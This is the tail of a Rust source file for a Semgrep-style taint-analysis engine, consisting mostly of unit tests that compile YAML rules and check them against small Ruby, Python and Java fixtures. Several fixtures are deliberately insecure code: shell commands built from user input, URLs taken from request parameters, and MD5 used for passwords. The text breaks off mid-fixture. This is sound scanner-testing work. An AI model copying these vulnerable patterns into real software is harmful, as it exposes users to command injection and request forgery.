/// True when `s` is a PHP variable: `$` followed by a valid identifier.
///
/// Examples: `$_GET`, `$_POST`, `$request`, `$cmd`.
///
/// This is a SOURCE-only shape — there is no meaningful PHP sink that is
/// just a bare variable name.
fn is_php_variable(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some('$') => {}
        _ => return false,
    }
    // After `$`, the rest must be a valid PHP identifier: [A-Za-z_][A-Za-z0-9_]*
    let rest: &str = &s[1..];
    if rest.is_empty() {
        return false;
    }
    is_identifier(rest)
}

fn map_severity(s: &str) -> Severity {
    match s.to_ascii_uppercase().as_str() {
        "ERROR" => Severity::Critical,
        "WARNING" => Severity::High,
        "INFO" => Severity::Medium,
        _ => Severity::Medium,
    }
}

fn extract_cwe(yaml: &YamlValue) -> Option<String> {
    let meta = yaml.get("metadata")?;
    let cwe = meta.get("cwe")?;
    match cwe {
        YamlValue::String(s) => Some(s.clone()),
        YamlValue::Sequence(v) => v.first().and_then(|x| x.as_str()).map(|s| s.to_string()),
        _ => None,
    }
}

// ─── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn compile(pattern: &str, role: MatcherRole) -> Option<GenericMatcher> {
        compile_pattern(pattern, role, Language::Python)
    }

    #[test]
    fn compile_attribute_source() {
        let m = compile("request.data", MatcherRole::Source).expect("attribute");
        match m {
            GenericMatcher::Attribute { root, field, .. } => {
                assert_eq!(root, "request");
                assert_eq!(field, "data");
            }
            _ => panic!("expected Attribute"),
        }
    }

    #[test]
    fn compile_nested_attribute_takes_leftmost_root_and_outermost_field() {
        let m = compile("request.session.user_id", MatcherRole::Source).expect("attribute");
        match m {
            GenericMatcher::Attribute { root, field, .. } => {
                assert_eq!(root, "request");
                assert_eq!(field, "user_id");
            }
            _ => panic!("expected Attribute"),
        }
    }

    #[test]
    fn compile_call_with_metavar() {
        let m = compile("pickle.loads($X)", MatcherRole::Sink).expect("call");
        match m {
            GenericMatcher::Call { canonical, .. } => assert_eq!(canonical, "pickle.loads"),
            _ => panic!("expected Call"),
        }
    }

    #[test]
    fn compile_call_with_ellipsis() {
        let m = compile("pickle.loads(...)", MatcherRole::Sink).expect("call");
        match m {
            GenericMatcher::Call { canonical, .. } => assert_eq!(canonical, "pickle.loads"),
            _ => panic!("expected Call"),
        }
    }

    #[test]
    fn compile_bare_func_call() {
        let m = compile("eval($X)", MatcherRole::Sink).expect("call");
        match m {
            GenericMatcher::Call { canonical, .. } => assert_eq!(canonical, "eval"),
            _ => panic!("expected Call"),
        }
    }

    // ── CALL-ON-MEMBER shape unit tests ─────────────────────────────────────

    #[test]
    fn compile_member_call_metavar_root_yields_fieldname_on_penultimate() {
        // `$CLIENT.chat.completions.create(...)` → FieldName { field: "completions" }
        let m = compile("$CLIENT.chat.completions.create(...)", MatcherRole::Source)
            .expect("member-call source");
        match m {
            GenericMatcher::FieldName { field, .. } => assert_eq!(field, "completions"),
            other => panic!("expected FieldName, got {other:?}"),
        }
        let m = compile("$CLIENT.messages.create(...)", MatcherRole::Source).expect("member-call");
        match m {
            GenericMatcher::FieldName { field, .. } => assert_eq!(field, "messages"),
            other => panic!("expected FieldName, got {other:?}"),
        }
    }

    #[test]
    fn compile_member_call_metavar_root_concrete_field_as_sink() {
        // `$CLIENT.calls.create(...)` (twiml sink) → FieldName { field: "calls" }.
        let m = compile("$CLIENT.calls.create(...)", MatcherRole::Sink).expect("member-call sink");
        match m {
            GenericMatcher::FieldName { field, .. } => assert_eq!(field, "calls"),
            other => panic!("expected FieldName, got {other:?}"),
        }
    }

    #[test]
    fn compile_member_call_metavar_penultimate_is_rejected() {
        // `request.$PROPERTY.get(...)` has a metavar penultimate → we refuse to
        // compile an any-field `.get(...)` matcher (too broad). It must NOT
        // become a FieldName.
        let m = compile("request.$PROPERTY.get(...)", MatcherRole::Source);
        assert!(
            !matches!(m, Some(GenericMatcher::FieldName { .. })),
            "metavar penultimate must not compile to FieldName, got {m:?}"
        );
    }

    #[test]
    fn compile_member_call_fully_concrete_stays_call() {
        // A fully-concrete chain must keep using `Call`, not the member-call path.
        let m = compile("flask.request.form.get(...)", MatcherRole::Source).expect("concrete call");
        match m {
            GenericMatcher::Call { canonical, .. } => {
                assert_eq!(canonical, "flask.request.form.get")
            }
            other => panic!("expected Call, got {other:?}"),
        }
    }

    #[test]
    fn parse_member_call_penultimate_edge_cases() {
        assert_eq!(
            parse_member_call_penultimate("$CLIENT.chat.completions.create"),
            Some("completions")
        );
        assert_eq!(parse_member_call_penultimate("$REQ.POST.get"), Some("POST"));
        // two-segment → handled elsewhere.
        assert_eq!(parse_member_call_penultimate("$CONN.executeQuery"), None);
        // metavar method → reject.
        assert_eq!(parse_member_call_penultimate("$REQ.POST.$M"), None);
        // metavar penultimate → reject.
        assert_eq!(parse_member_call_penultimate("request.$PROP.get"), None);
        // fully concrete → reject (Call handles it).
        assert_eq!(parse_member_call_penultimate("a.b.c"), None);
    }

    #[test]
    fn compile_bare_identifier_source() {
        let m = compile("request", MatcherRole::Source).expect("paramname");
        match m {
            GenericMatcher::ParamName { names, .. } => {
                assert_eq!(names, vec!["request".to_string()])
            }
            _ => panic!("expected ParamName"),
        }
    }

    #[test]
    fn bare_identifier_rejected_as_sink() {
        assert!(compile("request", MatcherRole::Sink).is_none());
    }

    #[test]
    fn weird_shapes_rejected() {
        // `$X + $Y` is NOT a sink source shape, but IS a valid Python
        // string-CONSTRUCTION source (`avoid-sqlalchemy-text`) — it compiles to
        // the reused `BinopFormat` matcher. See
        // `avoid_sqlalchemy_text_*` for the end-to-end faithfulness tests.
        assert!(matches!(
            compile("$X + $Y", MatcherRole::Source),
            Some(GenericMatcher::BinopFormat { .. })
        ));
        // As a SINK, a bare `$X + $Y` is still not an expressible shape here
        // (BinopFormat sinks require a recognised string-literal/format operand
        // shape, handled separately).
        assert!(compile("a.b.c(d", MatcherRole::Sink).is_none());
        assert!(compile("", MatcherRole::Source).is_none());
    }

    #[test]
    fn parse_full_taint_rule() {
        let yaml = r#"
id: semgrep-pickle-taint
mode: taint
languages: [python]
severity: ERROR
message: "Untrusted input reaches pickle.loads"
metadata:
  cwe: "CWE-502"
pattern-sources:
  - pattern: request.data
  - pattern: request
pattern-sinks:
  - pattern: pickle.loads($X)
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.id, "semgrep/semgrep-pickle-taint");
                assert_eq!(r.lang, Language::Python);
                assert_eq!(r.cwe.as_deref(), Some("CWE-502"));
                assert_eq!(r.spec.sources.len(), 2);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn non_taint_rule_falls_through() {
        let yaml = r#"
id: classic
pattern: eval(...)
message: x
severity: ERROR
languages: [python]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        assert!(matches!(parse_taint_rule(&v), TaintRuleParse::NotTaint));
    }

    #[test]
    fn taint_rule_with_unsupported_language_is_skipped() {
        let yaml = r#"
id: x
mode: taint
languages: [elixir]
severity: ERROR
message: m
pattern-sources: [{pattern: req}]
pattern-sinks: [{pattern: eval($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        assert!(matches!(parse_taint_rule(&v), TaintRuleParse::Skip(_)));
    }

    #[test]
    fn taint_rule_with_ruby_language_compiles() {
        let yaml = r#"
id: ruby-taint
mode: taint
languages: [ruby]
severity: ERROR
message: m
pattern-sources: [{pattern: gets($X)}]
pattern-sinks: [{pattern: system($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::Ruby);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_rb_alias_compiles_as_ruby() {
        let yaml = r#"
id: rb-taint
mode: taint
languages: [rb]
severity: ERROR
message: m
pattern-sources: [{pattern: gets($X)}]
pattern-sinks: [{pattern: eval($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => assert_eq!(r.lang, Language::Ruby),
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn ruby_taint_rule_produces_finding_for_source_to_sink_flow() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-cmd-injection
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted input reaches system"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: gets($X)
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = r#"
def run
  cmd = gets
  system(cmd)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("Ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for gets -> system flow, got none"
        );
        assert!(
            findings[0].description.contains("gets"),
            "description should mention source"
        );
    }

    // ── Ruby registry-rule taint skips: faithfulness gate ────────────────────
    //
    // These four tests load the ACTUAL `md5-used-as-password` and
    // `avoid-tainted-http-request` registry rules (via the real
    // `parse_taint_rule` → `compiled()` → `check()` path the CLI uses) and run
    // them against the registry `.rb` fixtures. Each rule is gated on:
    //   1. COMPILES to the intended matcher shapes,
    //   2. FIRES on every `ruleid` positive, and
    //   3. stays SILENT on every `ok` negative / near-miss (no over-match).

    /// `md5-used-as-password` source `Digest::MD5` compiles to a `Call`
    /// scope-path source, and its `$FUNCTION(...)` + `(?i).*password.*` sink to a
    /// `CallRegex` — the intended shapes.
    #[test]
    fn ruby_md5_used_as_password_compiles_to_intended_shapes() {
        let rule = compiled(
            r#"
id: md5-used-as-password
mode: taint
languages: [ruby]
severity: WARNING
message: m
pattern-sources:
- pattern: Digest::MD5
pattern-sinks:
- patterns:
  - pattern: $FUNCTION(...);
  - metavariable-regex:
      metavariable: $FUNCTION
      regex: (?i)(.*password.*)
"#,
        );
        assert_eq!(rule.lang, Language::Ruby);
        assert_eq!(rule.spec.sources.len(), 1, "one Digest::MD5 source");
        match &rule.spec.sources[0] {
            GenericMatcher::Call { canonical, .. } => assert_eq!(canonical, "Digest::MD5"),
            other => panic!("expected Call source, got {other:?}"),
        }
        assert_eq!(rule.spec.sinks.len(), 1, "one password CallRegex sink");
        assert!(
            matches!(rule.spec.sinks[0], GenericMatcher::CallRegex { .. }),
            "expected CallRegex sink, got {:?}",
            rule.spec.sinks[0]
        );
    }

    /// `md5-used-as-password` fires on the two MD5 positives and stays silent on
    /// the two SHA256 negatives (the discriminator keeps other digests silent).
    #[test]
    fn ruby_md5_used_as_password_fires_on_md5_only() {
        use crate::engine::parser::parse_file;
        let rule = compiled(
            r#"
id: md5-used-as-password
mode: taint
languages: [ruby]
severity: WARNING
message: m
pattern-sources:
- pattern: Digest::MD5
pattern-sinks:
- patterns:
  - pattern: $FUNCTION(...);
  - metavariable-regex:
      metavariable: $FUNCTION
      regex: (?i)(.*password.*)
"#,
        );
        let src = r#"
require 'digest'

def ex1(user, pwtext)
  user.set_password Digest::MD5.hexdigest pwtext
end

def ex2(user, pwtext)
  md5 = Digest::MD5.new
  md5.update pwtext
  dig = md5.hexdigest
  user.set_password dig
end

def ok1(user, pwtext)
  user.set_password Digest::SHA256.hexdigest pwtext
end

def ok2(user, pwtext)
  sha = Digest::SHA256.new
  sha.update pwtext
  dig = sha.hexdigest
  user.set_password dig
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            2,
            "MD5→set_password must fire twice (ex1, ex2), SHA256 silent; got {:?}",
            findings.iter().map(|f| f.line).collect::<Vec<_>>()
        );
    }

    /// `avoid-tainted-http-request` sinks enumerate to CONCRETE `Call` matchers
    /// (receiver + method fixed), one per listed method / constant.
    #[test]
    fn ruby_tainted_http_request_enumerates_concrete_call_sinks() {
        let rule = compiled(RUBY_TAINTED_HTTP_RULE);
        assert_eq!(rule.lang, Language::Ruby);
        assert!(
            rule.spec
                .sinks
                .iter()
                .all(|m| matches!(m, GenericMatcher::Call { .. })),
            "every enumerated sink must be a concrete Call, got {:?}",
            rule.spec.sinks
        );
        let canon: Vec<&str> = rule
            .spec
            .sinks
            .iter()
            .filter_map(|m| match m {
                GenericMatcher::Call { canonical, .. } => Some(canonical.as_str()),
                _ => None,
            })
            .collect();
        assert!(
            canon.contains(&"Net::HTTP.get"),
            "has Net::HTTP.get: {canon:?}"
        );
        assert!(
            canon.contains(&"Net::HTTP::Get.new"),
            "has Net::HTTP::Get.new: {canon:?}"
        );
        assert!(
            canon.contains(&"Net::HTTP.start") && canon.contains(&"Net::HTTP.post_form"),
            "has method-list entries: {canon:?}"
        );
        // No receiver-agnostic broadening leaked in.
        assert_eq!(
            canon.len(),
            34,
            "15 constructor + 19 method canonicals: {canon:?}"
        );
    }

    /// `avoid-tainted-http-request` fires on every tainted `Net::HTTP` call in
    /// the fixture and stays silent on the two literal-URL negatives.
    #[test]
    fn ruby_tainted_http_request_fires_on_positives_only() {
        use crate::engine::parser::parse_file;
        let rule = compiled(RUBY_TAINTED_HTTP_RULE);
        let src = r#"
require 'net/http'

def foo
  url = params[:url]
  Net::HTTP.get(url, "/index.html")
  Net::HTTP.get_response(params[:url])
  uri = URI(params[:url])
  Net::HTTP.post(uri)
  Net::HTTP.post_form(URI(params[:url]))
  uri = URI(params[:server])
  req = Net::HTTP::Get.new uri
  Net::HTTP.start(uri.host, uri.port) do |http|
    req = Net::HTTP::Get.new uri
    resp = http.request request
  end
  Net::HTTP::Get.new(params[:url])
  Net::HTTP::Post.new(URI(params[:url]))

  Net::HTTP.get("example.com", "/index.html")
  uri = URI("example.com/index.html")
  Net::HTTP::Get.new(uri)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            9,
            "9 tainted Net::HTTP calls fire, 2 literal-URL calls stay silent; got {:?}",
            findings.iter().map(|f| f.line).collect::<Vec<_>>()
        );
    }

    /// The full registry `avoid-tainted-http-request` rule text (both sink arms
    /// with their enumerated `metavariable-pattern` method / constant lists).
    const RUBY_TAINTED_HTTP_RULE: &str = r#"
id: avoid-tainted-http-request
mode: taint
languages: [ruby]
severity: WARNING
message: m
pattern-sources:
- pattern: params
- pattern: cookies
- pattern: request.env
pattern-sinks:
- pattern-either:
  - patterns:
    - pattern: Net::HTTP::$METHOD.new(...)
    - metavariable-pattern:
        metavariable: $METHOD
        patterns:
        - pattern-either:
          - pattern: Copy
          - pattern: Delete
          - pattern: Get
          - pattern: Head
          - pattern: Lock
          - pattern: Mkcol
          - pattern: Move
          - pattern: Options
          - pattern: Patch
          - pattern: Post
          - pattern: Propfind
          - pattern: Proppatch
          - pattern: Put
          - pattern: Trace
          - pattern: Unlock
  - patterns:
    - pattern: Net::HTTP.$X(...)
    - metavariable-pattern:
        metavariable: $X
        patterns:
        - pattern-either:
          - pattern: get
          - pattern: get2
          - pattern: head
          - pattern: head2
          - pattern: options
          - pattern: patch
          - pattern: post
          - pattern: post2
          - pattern: post_form
          - pattern: put
          - pattern: request
          - pattern: request_get
          - pattern: request_head
          - pattern: request_post
          - pattern: send_request
          - pattern: trace
          - pattern: get_print
          - pattern: get_response
          - pattern: start
"#;

    // ── `pattern-not` enforcement in taint `patterns:` AND-blocks ────────────
    //
    // Previously a `pattern-not:` inside a `pattern-sinks` `patterns:` block was
    // DROPPED, broadening the compiled matcher and over-reporting. These two
    // tests pin the fix: the SAME source→sink fixture fires on both sinks when
    // there is no `pattern-not`, and the allow-listed sink is suppressed when a
    // `pattern-not` names it. Both rules compile through the real
    // `parse_taint_rule` path the CLI uses.

    const PATTERN_NOT_SRC: &str = r#"
def handler():
    cmd = input()
    dangerous(cmd)
    allowlisted(cmd)
"#;

    #[test]
    fn taint_patterns_block_without_pattern_not_reports_both_sinks() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-no-negative
mode: taint
languages: [python]
severity: ERROR
message: "tainted input reaches a sink"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: input($X)
pattern-sinks:
  - pattern: dangerous($X)
  - pattern: allowlisted($X)
"#,
        );
        let tree = parse_file(PATTERN_NOT_SRC, Language::Python).expect("fixture parses");
        let findings = rule.check(PATTERN_NOT_SRC, &tree);
        assert_eq!(
            findings.len(),
            2,
            "both dangerous() and allowlisted() sinks should fire without pattern-not, got {:?}",
            findings.iter().map(|f| f.line).collect::<Vec<_>>()
        );
    }

    #[test]
    fn taint_patterns_block_pattern_not_suppresses_allowlisted_sink() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-with-negative
mode: taint
languages: [python]
severity: ERROR
message: "tainted input reaches a sink"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: input($X)
pattern-sinks:
  - pattern: dangerous($X)
  - patterns:
      - pattern: allowlisted($X)
      - pattern-not: allowlisted($X)
"#,
        );
        let tree = parse_file(PATTERN_NOT_SRC, Language::Python).expect("fixture parses");
        let findings = rule.check(PATTERN_NOT_SRC, &tree);
        assert_eq!(
            findings.len(),
            1,
            "pattern-not should suppress the allowlisted() sink, leaving only dangerous(); got {:?}",
            findings
                .iter()
                .map(|f| f.sink_description.clone())
                .collect::<Vec<_>>()
        );
        assert!(
            findings[0]
                .sink_description
                .as_deref()
                .map(|d| d.contains("dangerous"))
                .unwrap_or(false),
            "the surviving finding should be the dangerous() sink, got {:?}",
            findings[0].sink_description
        );
    }

    // ── `pattern-inside` enforcement in taint `patterns:` AND-blocks ─────────
    //
    // Previously a `pattern-inside:` inside a `pattern-sinks` `patterns:` block
    // was DROPPED, so the sink matched EVERYWHERE instead of only inside the
    // required region — the rule fired far too broadly. These tests pin the
    // fix: with an identical tainted flow present in TWO functions, the rule
    // fires on BOTH sinks when there is no `pattern-inside`, and only on the
    // sink inside the named region when a `pattern-inside` restricts it. Both
    // rules compile through the real `parse_taint_rule` path the CLI uses.
    //
    // `pattern-inside` is the INVERSE of `pattern-not` (which suppresses a
    // finding whose sink is INSIDE the region): `pattern-inside` keeps a
    // finding only when its sink IS inside the region.

    const PATTERN_INSIDE_SRC: &str = r#"
def safe_zone():
    cmd = input()
    dangerous(cmd)

def other_zone():
    cmd = input()
    dangerous(cmd)
"#;

    #[test]
    fn taint_patterns_block_without_pattern_inside_reports_both_regions() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-no-inside
mode: taint
languages: [python]
severity: ERROR
message: "tainted input reaches a sink"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: input($X)
pattern-sinks:
  - pattern: dangerous($X)
"#,
        );
        let tree = parse_file(PATTERN_INSIDE_SRC, Language::Python).expect("fixture parses");
        let findings = rule.check(PATTERN_INSIDE_SRC, &tree);
        assert_eq!(
            findings.len(),
            2,
            "without pattern-inside, dangerous() should fire in BOTH functions, got lines {:?}",
            findings.iter().map(|f| f.line).collect::<Vec<_>>()
        );
    }

    #[test]
    fn taint_patterns_block_pattern_inside_restricts_to_region() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-with-inside
mode: taint
languages: [python]
severity: ERROR
message: "tainted input reaches a sink"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: input($X)
pattern-sinks:
  - patterns:
      - pattern: dangerous($X)
      - pattern-inside: |
          def safe_zone():
              ...
"#,
        );
        let tree = parse_file(PATTERN_INSIDE_SRC, Language::Python).expect("fixture parses");
        let findings = rule.check(PATTERN_INSIDE_SRC, &tree);
        assert_eq!(
            findings.len(),
            1,
            "pattern-inside should keep ONLY the sink inside safe_zone(), got lines {:?}",
            findings.iter().map(|f| f.line).collect::<Vec<_>>()
        );
        // The surviving finding must be the `dangerous(cmd)` on line 4 (inside
        // safe_zone), NOT the identical one on line 8 (inside other_zone).
        assert_eq!(
            findings[0].line, 4,
            "the surviving finding should be inside safe_zone() (line 4), got line {}",
            findings[0].line
        );
    }

    // ── Bridge-level (end-to-end) tests for BARE-IDENTIFIER Ruby sources ─────
    //
    // These compile a rule through `parse_taint_rule` (the SAME path the CLI
    // uses) where the source is a bare identifier (`params`, `gets`) with no
    // parens. The bridge compiles those to `GenericMatcher::ParamName`, which
    // is the path that was previously broken end-to-end (the `analyze_tree`
    // unit tests bypassed it by hand-building `Call` specs). We assert the
    // sink line and that a sanitized variant produces no finding.

    /// `params[:cmd] → system(cmd)` via the bare-identifier `params` source.
    #[test]
    fn ruby_bridge_bare_params_source_to_system_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-params-cmdi
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted params reaches system"
pattern-sources:
  - pattern: params
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = r#"
def handler
  cmd = params[:cmd]
  system(cmd)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("Ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for params[:cmd] -> system, got {:?}",
            findings
        );
        // sink is on the `system(cmd)` line (line 4 with leading newline).
        assert_eq!(
            findings[0].line, 4,
            "finding should be at the system() sink line"
        );
    }

    /// Bare `gets` (no parens) → `system(cmd)` via the `ParamName` bridge path.
    #[test]
    fn ruby_bridge_bare_gets_source_to_system_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-gets-cmdi
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted gets reaches system"
pattern-sources:
  - pattern: gets
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = r#"
def handler
  cmd = gets
  system(cmd)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("Ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for bare gets -> system, got {:?}",
            findings
        );
        assert_eq!(
            findings[0].line, 4,
            "finding should be at the system() sink line"
        );
    }

    /// A sanitizer between a bare-identifier source and the sink blocks the
    /// flow end-to-end (still through the bridge).
    #[test]
    fn ruby_bridge_bare_params_source_sanitized_produces_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-params-cmdi-sanitized
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted params reaches system"
pattern-sources:
  - pattern: params
pattern-sanitizers:
  - pattern: Shellwords.escape($X)
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = r#"
def handler
  cmd = Shellwords.escape(params[:cmd])
  system(cmd)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("Ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "sanitized params flow must produce no finding, got {:?}",
            findings
        );
    }

    /// The dotted `request.params` source must keep firing end-to-end (it was
    /// already working — this is a regression guard).
    #[test]
    fn ruby_bridge_dotted_request_params_source_still_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-request-params-cmdi
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted request.params reaches system"
pattern-sources:
  - pattern: request.params
pattern-sinks:
  - pattern: system($X)
"#,
        );

        let src = r#"
def handler
  val = request.params[:q]
  system(val)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("Ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "dotted request.params -> system must still fire, got {:?}",
            findings
        );
    }

    /// Near-miss: a bare-identifier source that never reaches the sink must
    /// produce no finding (end-to-end via the bridge).
    #[test]
    fn ruby_bridge_bare_params_source_near_miss_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-params-cmdi-nearmiss
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted params reaches system"
pattern-sources:
  - pattern: params
pattern-sinks:
  - pattern: system($X)
"#,
        );

        // `safe` is a literal, never tainted; `cmd` is tainted but not used.
        let src = r#"
def handler
  cmd = params[:cmd]
  safe = "ls"
  system(safe)
end
"#;
        let tree = parse_file(src, Language::Ruby).expect("Ruby fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "untainted argument must not fire, got {:?}",
            findings
        );
    }

    #[test]
    fn taint_rule_with_c_language_compiles() {
        let yaml = r#"
id: c-taint
mode: taint
languages: [c]
severity: ERROR
message: m
pattern-sources: [{pattern: getenv($X)}]
pattern-sinks: [{pattern: system($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::C);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_kotlin_language_compiles() {
        let yaml = r#"
id: kotlin-taint
mode: taint
languages: [kotlin]
severity: ERROR
message: m
pattern-sources: [{pattern: request.getParameter($X)}]
pattern-sinks: [{pattern: Runtime.exec($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::Kotlin);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_kt_alias_compiles_as_kotlin() {
        let yaml = r#"
id: kt-taint
mode: taint
languages: [kt]
severity: ERROR
message: m
pattern-sources: [{pattern: call.receiveText($X)}]
pattern-sinks: [{pattern: Runtime.exec($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => assert_eq!(r.lang, Language::Kotlin),
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_javascript_language_compiles() {
        let yaml = r#"
id: js-taint
mode: taint
languages: [javascript]
severity: ERROR
message: m
pattern-sources: [{pattern: req.query}]
pattern-sinks: [{pattern: eval($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::JavaScript);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_typescript_language_compiles_as_javascript() {
        let yaml = r#"
id: ts-taint
mode: taint
languages: [typescript]
severity: ERROR
message: m
pattern-sources: [{pattern: req.body}]
pattern-sinks: [{pattern: eval($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => assert_eq!(r.lang, Language::JavaScript),
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_go_language_compiles() {
        let yaml = r#"
id: go-taint
mode: taint
languages: [go]
severity: ERROR
message: m
pattern-sources: [{pattern: c.Query($X)}]
pattern-sinks: [{pattern: exec.Command($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::Go);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn taint_rule_with_java_language_compiles() {
        let yaml = r#"
id: java-taint
mode: taint
languages: [java]
severity: ERROR
message: m
pattern-sources: [{pattern: request.getParameter($X)}]
pattern-sinks: [{pattern: Runtime.exec($X)}]
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                assert_eq!(r.lang, Language::Java);
                assert_eq!(r.spec.sources.len(), 1);
                assert_eq!(r.spec.sinks.len(), 1);
            }
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    #[test]
    fn java_taint_rule_produces_finding_for_source_to_sink_flow() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: java-cmd-injection
mode: taint
languages: [java]
severity: ERROR
message: "Tainted input reaches Runtime.exec"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: request.getParameter($X)
pattern-sinks:
  - pattern: Runtime.exec($X)
"#,
        );

        // Source: request.getParameter(...) → cmd → Runtime.exec(cmd)
        let src = r#"
class Controller {
    void run(HttpServletRequest request) throws Exception {
        String cmd = request.getParameter("cmd");
